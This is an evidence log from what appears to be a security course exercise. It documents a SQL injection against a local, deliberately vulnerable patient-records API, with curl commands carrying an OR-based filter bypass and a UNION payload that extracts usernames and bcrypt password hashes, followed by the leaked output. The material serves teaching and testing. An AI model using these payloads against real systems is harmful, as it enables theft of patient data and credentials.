@@ -1,0 +1,14 @@
+# Evidência : V2 SQLi (ANTES): parâmetro nome concatenado altera a query — retorna pacientes fora do filtro e extrai hashes via UNION
+# Exercício : ex09   Rubrica(s): R15
+# Data      : 2026-09-28 09:35:11 -0400
+# Commit    : 104f916 (ex08-vulneravel)
+# Comando   : TC=$(scripts/token.sh dra_carla); H="Authorization: Bearer $TC"; echo '=== busca legitima nome=Ana ==='; curl -s -G localhost:8000/pacientes --data-urlencode 'nome=Ana' -H "$H"; echo; echo '=== injecao 1: bypass do filtro (retorna TODOS os pacientes) ==='; curl -s -G localhost:8000/pacientes --data-urlencode "nome=' OR '1'='1" -H "$H"; echo; echo '=== injecao 2: UNION extrai username+senha_hash da tabela usuario ==='; curl -s -G localhost:8000/pacientes --data-urlencode "nome=' UNION SELECT username, papel, senha_hash, 0 FROM usuario -- " -H "$H"; echo
+# ------------------------------------------------------------------
+=== busca legitima nome=Ana ===
+[[1,"Ana Souza","111.111.111-11",1]]
+=== injecao 1: bypass do filtro (retorna TODOS os pacientes) ===
+[[1,"Ana Souza","111.111.111-11",1],[2,"Bruno Lima","222.222.222-22",2]]
+=== injecao 2: UNION extrai username+senha_hash da tabela usuario ===
+[[1,"Ana Souza","111.111.111-11",1],[2,"Bruno Lima","222.222.222-22",2],["admin","admin","$2b$12$yhOpuDpfnLP1kjQNbMOIeuZ2e80rDENwkt43ydCmqXJeLQ2ItIbk6",0],["dr_diego","profissional","$2b$12$BeTiXnl8mHTuwZaaTbZ/D.ssVx8hwkMOD2WQLQtwFu8kLcxbvPemC",0],["dra_carla","profissional","$2b$12$tnHqhY/j9LF9cYAAjrbTOuDVOkljyiOj7KYIICUdh4muzZZhruAPm",0],["recepcao","recepcao","$2b$12$Yud9cDCHKHyChIGwOB/K6eoA4OKT2.PLeAVJ1HcBXfK1bzeQLr/Bm",0]]
+# ------------------------------------------------------------------
+# exit code : 0
